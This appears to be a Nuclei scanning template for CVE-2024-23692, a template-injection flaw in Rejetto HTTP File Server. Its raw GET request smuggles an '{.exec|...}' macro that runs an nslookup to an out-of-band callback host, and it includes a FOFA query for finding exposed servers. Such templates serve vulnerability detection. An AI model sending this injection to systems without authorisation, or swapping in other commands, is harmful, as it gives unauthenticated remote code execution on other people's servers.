id: CVE-2024-23692
info:
  name: Rejetto HTTP File Server - Template injection
  author: Ayu
  severity: Critical
  description: This vulnerability allows a remote, unauthenticated attacker to execute arbitrary commands on the affected system by sending a specially crafted HTTP request
  metadata:
    fofa-query:
      - app="HFS"
  reference:
    - https://github.com/rapid7/metasploit-framework/pull/19240
  tags: rce, cve, 2024

http:
  - raw:
      - |
        GET /?n=%0A&cmd=nslookup+{{interactsh-url}}&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.2; rv:122.0) Gecko/20000101 Firefox/123.0

    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, "dns")
          - contains(body, "rejetto")
        condition: and
